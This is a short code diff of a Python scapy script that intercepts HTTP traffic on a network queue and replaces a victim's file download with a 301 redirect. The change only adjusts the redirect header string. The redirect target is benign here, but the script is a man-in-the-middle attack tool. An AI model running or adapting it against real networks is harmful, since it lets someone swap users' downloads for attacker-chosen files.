@@ -23,14 +23,13 @@ def process_packet(packet):
 #remove seq field from each captured packet once it has been processed
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing File")
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: www.microsoft.com"
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: www.microsoft.com\n\n"
 #del and scapy will auto complete for each modified packet
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
                 del scapy_packet[scapy.TCP].chksum
 #set scapy_packet to a string and set payload which will save the packet
                 packet.set_payload(str(scapy_packet))
-
     packet.accept()
 
 #create instance of queue
